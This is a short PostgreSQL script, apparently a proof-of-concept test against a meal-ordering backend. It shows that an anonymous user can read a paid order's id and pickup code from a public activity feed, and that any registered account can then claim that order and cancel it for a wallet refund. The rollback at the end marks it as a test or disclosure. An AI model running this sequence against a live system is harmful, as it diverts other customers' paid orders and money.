\set ON_ERROR_STOP 1
begin;
update settings set cutoff = '23:59', special_cutoff = '23:58', max_meals = 30 where id = 1;
select id as s1 from sites where name like 'Pent%' \gset
select k.id as k1 from kitchens k where k.active order by name limit 1 \gset
select id as i1 from menu_items where kitchen_id = :'k1' and active limit 1 \gset
select kitchen_accept_terms(token) from kitchens where id = :'k1';
select kitchen_open_day(token, current_order_date()) from kitchens where id = :'k1';
set request.jwt.claims = '{}'; set role anon;
select place_order(:'s1', :'i1', 2, 'Victim Guest', '0241111111', 'REF1234') ->> 'id' as v \gset
reset role;
update orders set status = 'paid' where id = :'v';   -- coordinator verified the MoMo
-- Attacker: anonymous, reads the public activity feed
set role anon;
select 'leaked id', (select id from recent_activity order by created_at desc limit 1) = :'v' as leaked;
select 'code from my_orders', code, amount_due from my_orders(array[:'v'::uuid]);
-- Attacker signs up (any account) and claims + cancels
set request.jwt.claims = '{"sub":"11111111-1111-1111-1111-111111111111","email":"attacker@x.com"}'; set role authenticated;
select 'claimed', claim_orders(array[:'v'::uuid]);
select 'cancel', cancel_order(:'v', 'x', 'wallet');
select 'attacker wallet', wallet_balance('11111111-1111-1111-1111-111111111111');
rollback;
